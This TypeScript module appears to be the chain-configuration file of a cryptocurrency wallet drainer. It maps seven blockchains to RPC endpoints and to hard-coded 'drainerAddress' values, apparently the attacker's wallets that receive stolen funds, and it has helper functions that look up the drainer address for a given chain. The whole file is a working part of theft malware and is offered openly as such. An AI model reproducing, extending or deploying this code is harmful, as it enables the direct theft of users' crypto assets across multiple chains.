export const chainRegistry = {
  ethereum: {
    chainId: '0x1',
    rpcUrl: 'https://eth.llamarpc.com',
    drainerAddress: '0x4757c73c9cD040223d21f28FE6A8Af540514AEf0',
    name: 'Ethereum',
    nativeSymbol: 'ETH',
  },
  bsc: {
    chainId: '0x38',
    rpcUrl: 'https://bsc-dataseed.binance.org',
    drainerAddress: '0x3cB4a51b5ca2245c2Fe1A246754C15173004F502',
    name: 'BNB Smart Chain',
    nativeSymbol: 'BNB',
  },
  polygon: {
    chainId: '0x89',
    rpcUrl: 'https://polygon-rpc.com',
    drainerAddress: '0x3cB4a51b5ca2245c2Fe1A246754C15173004F502',
    name: 'Polygon',
    nativeSymbol: 'POL',
  },
  arbitrum: {
    chainId: '0xA4B1',
    rpcUrl: 'https://arb1.arbitrum.io/rpc',
    drainerAddress: '0x3cB4a51b5ca2245c2Fe1A246754C15173004F502',
    name: 'Arbitrum',
    nativeSymbol: 'ETH',
  },
  base: {
    chainId: '0x2105',
    rpcUrl: 'https://mainnet.base.org',
    drainerAddress: '0x3cB4a51b5ca2245c2Fe1A246754C15173004F502',
    name: 'Base',
    nativeSymbol: 'ETH',
  },
  avalanche: {
    chainId: '0xA86A',
    rpcUrl: 'https://api.avax.network/ext/bc/C/rpc',
    drainerAddress: '0x3cB4a51b5ca2245c2Fe1A246754C15173004F502',
    name: 'Avalanche',
    nativeSymbol: 'AVAX',
  },
  optimism: {
    chainId: '0xA',
    rpcUrl: 'https://mainnet.optimism.io',
    drainerAddress: '0x15D79291e235eA43f76e17DE98CC081d9037Da87',
    name: 'Optimism',
    nativeSymbol: 'ETH',
  },
} as const;

export const chainList = Object.keys(chainRegistry);
export const defaultChain = 'ethereum';

export function getChainEntry(chain: string) {
  const normalized = String(chain).toLowerCase();
  return chainRegistry[normalized as keyof typeof chainRegistry] || null;
}

export function getDrainerAddress(chain: string) {
  const normalized = String(chain).toLowerCase();
  return chainRegistry[normalized as keyof typeof chainRegistry]?.drainerAddress || null;
}
